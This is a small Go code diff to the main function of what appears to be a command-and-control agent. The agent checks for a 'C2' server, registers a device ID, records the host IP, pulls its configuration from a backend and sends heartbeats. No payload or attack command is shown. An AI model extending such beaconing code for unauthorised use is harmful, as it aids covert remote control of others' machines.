@@ -16,12 +16,12 @@ func main() {
 	helper.CheckForInternet()
 	helper.UpdateSystem()
 	helper.CheckForC2Server(config.Config.C2)
+	config.Config.IpStr = helper.GetIP().String()
 	if !config.CheckIfDeviceIDExits() {
 		api.GetDeviceIDFromAPI()
 		config.WriteConfToYAML()
 	}
-	api.GetConfFromBackend()
-	config.WriteConfToYAML()
+	go api.GetConfFromBackend()
 	go api.Heartbeat()
 	for {}
 
